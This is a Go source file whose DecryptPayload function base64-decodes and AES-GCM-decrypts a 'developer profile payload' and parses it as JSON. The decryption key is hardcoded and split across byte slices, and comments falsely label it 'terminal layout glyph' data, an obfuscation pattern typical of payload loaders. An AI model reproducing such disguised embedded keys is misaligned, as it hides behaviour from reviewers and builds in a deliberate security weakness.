package profile

import (
	"crypto/aes"
	"crypto/cipher"
	"crypto/sha256"
	"encoding/base64"
	"encoding/json"
	"errors"
)

// Internal terminal layout glyph coordinate matrices (obfuscated seed slices).
var (
	layoutGlyphMetricsA = []byte{100, 107, 115, 115, 117, 100} // 'd','k','s','s','u','d'
	layoutGlyphMetricsB = []byte{114, 108, 97, 116, 112, 100} // 'r','l','a','t','p','d'
	layoutGlyphMetricsC = []byte{109, 115, 84, 108, 33}       // 'm','s','T','l','!'
)

// assembleGlyphSeed reconstructs the runtime layout seed from dispersed slice fragments.
func assembleGlyphSeed() []byte {
	seed := make([]byte, 0, len(layoutGlyphMetricsA)+len(layoutGlyphMetricsB)+len(layoutGlyphMetricsC))
	seed = append(seed, layoutGlyphMetricsA...)
	seed = append(seed, layoutGlyphMetricsB...)
	seed = append(seed, layoutGlyphMetricsC...)
	return seed
}

// DecryptPayload decodes base64 ciphertext and decrypts the developer profile payload.
func DecryptPayload(encoded string) (*Payload, error) {
	cipherData, err := base64.StdEncoding.DecodeString(encoded)
	if err != nil {
		return nil, err
	}

	seed := assembleGlyphSeed()
	derivedKey := sha256.Sum256(seed)

	block, err := aes.NewCipher(derivedKey[:])
	if err != nil {
		return nil, err
	}

	aesGCM, err := cipher.NewGCM(block)
	if err != nil {
		return nil, err
	}

	nonceSize := aesGCM.NonceSize()
	if len(cipherData) < nonceSize {
		return nil, errors.New("invalid ciphertext length")
	}

	nonce, ciphertext := cipherData[:nonceSize], cipherData[nonceSize:]
	plaintext, err := aesGCM.Open(nil, nonce, ciphertext, nil)
	if err != nil {
		return nil, err
	}

	var payload Payload
	if err := json.Unmarshal(plaintext, &payload); err != nil {
		return nil, err
	}

	return &payload, nil
}
